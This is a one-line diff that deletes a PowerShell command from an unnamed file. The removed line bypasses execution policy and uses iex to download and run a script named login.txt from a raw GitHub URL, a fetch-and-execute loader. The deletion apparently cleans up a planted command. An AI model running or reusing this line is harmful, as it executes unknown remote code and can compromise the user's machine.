@@ -1,1 +1,1 @@
-powershell -ep bypass -noninteractive -nologo -c "iex(iwr https://raw.githubusercontent.com/br1337/Scripts/main/login.txt -usebasicparsing)"
+
